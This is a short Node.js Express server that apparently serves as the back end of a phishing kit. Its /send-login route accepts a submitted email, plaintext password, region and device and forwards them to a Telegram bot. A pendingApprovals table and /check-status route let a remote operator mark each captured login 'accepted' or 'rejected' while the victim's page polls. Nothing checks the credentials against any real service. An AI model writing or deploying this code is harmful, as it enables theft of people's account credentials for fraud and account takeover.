import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { sendLoginTelegram } from "./bot.js"; // import the bot function

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

export const pendingApprovals = {}; // { email: { status: 'pending'|'accepted'|'rejected' } }

app.post("/send-login", async (req, res) => {
  const { email, password, region, device } = req.body;
  if (!email || !password) return res.status(400).send({ error: "Missing email or password" });

  // Mark email as pending
  pendingApprovals[email] = { status: "pending" };

  // Send message to Telegram
  try {
    await sendLoginTelegram(email, password, region || "Unknown", device || "Unknown");
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
  }

  res.json({ status: "ok" });
});

app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
